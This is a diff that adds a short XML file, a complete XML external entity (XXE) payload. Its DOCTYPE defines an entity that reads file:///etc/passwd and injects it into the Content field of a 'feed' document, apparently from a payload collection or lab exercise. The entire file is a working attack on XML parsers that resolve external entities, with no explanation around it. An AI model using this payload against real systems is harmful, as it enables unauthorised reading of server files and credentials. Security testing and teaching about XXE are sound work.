@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+  <!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+  ]>
+  <feed>
+    <Author>raj</Author>
+    <Subject>chandel</Subject>
+    <Content>&xxe;</Content>
+  </feed>
